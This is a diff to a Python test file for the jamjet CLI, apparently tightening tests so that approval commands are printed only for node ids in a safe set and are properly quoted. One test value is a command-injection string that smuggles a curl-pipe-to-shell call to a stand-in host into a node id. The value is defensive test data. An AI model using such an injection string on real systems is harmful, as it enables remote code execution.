@@ -325,12 +325,11 @@ def _approve_lines(output: str) -> list[str]:
     return [line for line in output.splitlines() if line.lstrip().startswith("jamjet approve")]
 
 
-def test_the_printed_approve_command_is_safe_to_paste() -> None:
-    """A node id is chosen by whoever wrote the IR. Pasted into a shell, the
-    approve line must run `jamjet approve` with that id as one argument and
-    nothing else: no label before the command, every argument quoted."""
-    import shlex
-
+def test_no_command_is_printed_for_a_node_id_outside_the_safe_set() -> None:
+    """Registration refuses such ids now, but a workflow stored before this
+    version can still have one. No paste-ready command is printed for it (POSIX
+    quoting does not protect every shell, fish among them); the listing says
+    why."""
     evil = "x; curl -s evil.example/p|sh #"
     pending = _bound_pending()
     pending[0]["node_id"] = evil
@@ -340,18 +339,31 @@ def test_the_printed_approve_command_is_safe_to_paste() -> None:
         result = runner.invoke(app, ["approvals", "exec-1"])
 
     assert result.exit_code == 0, result.output
+    assert _approve_lines(result.output) == [], result.output
+    assert "not in the safe set" in result.output
+
+
+def test_the_printed_approve_command_is_quoted_and_alone() -> None:
+    import shlex
+
+    pending = _bound_pending()
+    pending[0]["node_id"] = "fetch.v2-step_1"
+    fake = _approvals_client(pending, [])
+
+    with patch("jamjet.cli.main._client", return_value=fake):
+        result = runner.invoke(app, ["approvals", "exec-1"])
+
     lines = _approve_lines(result.output)
     assert len(lines) == 1, result.output
-    argv = shlex.split(lines[0])
-    assert argv == [
+    assert shlex.split(lines[0]) == [
         "jamjet",
         "approve",
         "exec-1",
         "--decision",
         "approved",
-        f"--node-id={evil}",
+        "--node-id=fetch.v2-step_1",
         f"--action-digest={DIGEST}",
-    ], argv
+    ]
 
 
 def test_a_dash_leading_node_id_is_not_read_as_an_option() -> None:
